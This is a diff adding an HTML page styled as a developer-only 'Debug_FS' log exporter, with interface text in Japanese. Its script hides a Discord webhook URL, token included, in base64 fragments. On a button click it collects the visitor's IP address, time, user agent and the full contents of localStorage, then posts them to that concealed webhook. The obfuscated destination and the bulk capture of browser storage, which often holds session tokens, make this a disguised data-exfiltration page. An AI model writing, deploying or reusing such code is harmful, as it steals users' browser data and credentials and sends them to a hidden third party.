@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>Debug_FS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-gradient: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      --accent-color: #1a1a1a;
+      --text-main: #2d3436;
+      --text-sub: #636e72;
+      --error: #d63031;
+      --success: #00b894;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: var(--bg-gradient);
+      color: var(--text-main);
+    }
+
+    .glass-card {
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(10px);
+      padding: 48px 40px;
+      border-radius: 2px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 400px;
+      border-left: 4px solid var(--accent-color);
+    }
+
+    .header-area {
+      margin-bottom: 40px;
+    }
+
+    .header-area span {
+      font-size: 11px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--text-sub);
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 600;
+      margin: 0;
+      letter-spacing: -0.5px;
+    }
+
+    .info-box {
+      font-size: 13px;
+      line-height: 1.8;
+      color: var(--text-sub);
+      margin-bottom: 48px;
+    }
+
+    .info-box b {
+      color: var(--text-main);
+    }
+
+    button {
+      all: unset;
+      width: 100%;
+      height: 54px;
+      background: var(--accent-color);
+      color: #fff;
+      text-align: center;
+      font-weight: 500;
+      font-size: 14px;
+      letter-spacing: 1px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    button:hover {
+      background: #333;
+      transform: translateY(-2px);
+    }
+
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    #status {
+      margin-top: 24px;
+      font-size: 12px;
+      letter-spacing: 0.5px;
+      min-height: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      font-weight: 500;
+    }
+
+    .status-error { color: var(--error); }
+    .status-success { color: var(--success); }
+
+    .loading-bar {
+      width: 20px;
+      height: 2px;
+      background: var(--accent-color);
+      margin-right: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    .loading-bar::after {
+      content: "";
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: #fff;
+      animation: loading 1s infinite linear;
+    }
+
+    @keyframes loading {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="glass-card">
+    <div class="header-area">
+      <span>Log Exporter</span>
+      <h1>Debug_FS</h1>
+    </div>
+    
+    <div class="info-box">
+      <b>開発者以外使用禁止</b> デバッグ用ログ転送シーケンスを開始します。<br>
+      送信データには <b>IP, Time, UA, LS</b> が含まれます。
+    </div>
+    
+    <button id="main-send-button">EXECUTE EXPORT</button>
+    
+    <div id="status"></div>
+  </div>
+
+  <script>
+    (() => {
+      'use strict';
+
+      const DEBUG_FS_OBFUSCATED = [
+        'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi',
+        'aG9va3MvMTQ1MDc0OTQ4NTA3OTcyNDE0OS9m',
+        'M2xsSlczLWFEa3dQMW9TYms3TlVCSlUwaS1F',
+        'SGtyaXhqb0NrVTVWb1JFNEJNOWdvWkZpd2d3',
+        'd2NUSlJLYjlhQjJZNg=='
+      ];
+
+      const statusEl = document.getElementById('status');
+      const btnEl = document.getElementById('main-send-button');
+      
+      function updateStatus(msg, type = '') {
+        statusEl.innerHTML = '';
+        if (type === 'loading') {
+          const bar = document.createElement('div');
+          bar.className = 'loading-bar';
+          statusEl.appendChild(bar);
+        }
+        const span = document.createElement('span');
+        span.textContent = msg;
+        statusEl.appendChild(span);
+        statusEl.className = type === 'error' ? 'status-error' : (type === 'success' ? 'status-success' : '');
+      }
+
+      // IPアドレス取得ロジック（修正済み）
+      async function getIp() {
+        try {
+          const r = await fetch('https://api.ipify.org?format=json');
+          const d = await r.json();
+          return d.ip;
+        } catch (e) { return '取得失敗'; }
+      }
+
+      async function runExport() {
+        if (!btnEl) return;
+        btnEl.disabled = true;
+        updateStatus('PREPARING...', 'loading');
+
+        const url = ((p) => { try { return atob(p.join('')); } catch (e) { return null; } })(DEBUG_FS_OBFUSCATED);
+        if (!url) {
+          updateStatus('CONFIG ERROR', 'error');
+          btnEl.disabled = false;
+          return;
+        }
+
+        const ip = await getIp(); // IP取得を待機
+        const tm = new Date().toLocaleString('ja-JP');
+        const ua = navigator.userAgent;
+
+        let msg = "## Debug-DbFS\n";
+        msg += `-# **TIME**: ${tm}\n-# **IP**: ${ip}\n-# **UserA**: \`${ua}\`\n## LS\n`;
+
+        let hasData = false;
+        for (let i = 0; i < localStorage.length; i++) {
+          hasData = true;
+          const k = localStorage.key(i);
+          const v = localStorage.getItem(k);
+          msg += `**${k}**: ${v}\n`; // 太字のみのフォーマット
+        }
+        if (!hasData) msg += "*LocalStorage is empty*";
+
+        try {
+          updateStatus('UPLOADING...', 'loading');
+          const res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: msg.substring(0, 2000) })
+          });
+
+          
+          if (res.ok) {
+            updateStatus('SEQUENCE COMPLETE', 'success');
+          } else {
+            updateStatus('FAILED: ' + res.status, 'error');
+            btnEl.disabled = false;
+          }
+        } catch (e) {
+          updateStatus('CONNECTION ERROR', 'error');
+          btnEl.disabled = false;
+        }
+      }
+
+      // クリックイベントのみで動作するように固定
+      btnEl?.addEventListener('click', runExport);
+    })();
+  </script>
+</body>
+</html>
